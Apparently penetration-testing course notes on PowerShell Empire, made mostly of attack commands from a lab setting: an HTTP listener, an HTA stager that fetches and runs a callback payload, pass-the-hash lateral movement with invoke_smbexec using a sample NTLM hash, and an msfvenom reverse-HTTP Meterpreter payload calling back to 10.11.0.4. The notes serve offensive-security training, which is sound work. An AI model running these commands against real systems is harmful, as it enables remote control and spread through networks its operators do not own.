# Module 23 (Powershell Empire)

## Powershell Empire&#x20;

### Listener

```
// Empire commands used
?
uselistener http
info
```

<figure><img src="../../.gitbook/assets/image (376).png" alt=""><figcaption></figcaption></figure>

Starting the listener:

```bash
execute
```

### Stager

Stager will download and execute the final payload which will call back to the listener we set up previously - `http`- below shows how to set it up:

```bash
//specify what stager to use
usestager windows/hta

//associate stager with the http listener
set Listener meterpreter

//write stager to the file
set OutFile stage.hta

//create the stager
execute
```

<figure><img src="../../.gitbook/assets/image (378).png" alt=""><figcaption></figcaption></figure>

### Lateral Movement

```bash
usemodule lateral_movement/technique
usemodule lateral_movement/invoke_smbexec
```

```
set ComputerName client251
set Listener http
set Username jeff_admin
set Hash e2b475c11da2a0748290d87aa966c327
set Domain corp.com
execute
```

### Switching Between Empire and Metasploit

Metasploit to Empire

```
msfvenom -p windows/meterpreter/reverse_http LHOST=10.11.0.4 LPORT=7777 -
f exe -o met.exe
use multi/handler
set payload windows/meterpreter/reverse_http
set LPORT 7777
set LHOST 10.11.0.4
run
```

Empire&#x20;

```
upload /home/h3ckt0r/met.exe
shell dir
shell C:\Users\offsec.corp\Downloads>met.exe
```

Empire to Metasploit

```
 usestager windows/launcher_bat
 set Listener http
 execute
```

Metasploit

```
upload /tmp/launcher.bat
shell
dir
lanucher.bat
```
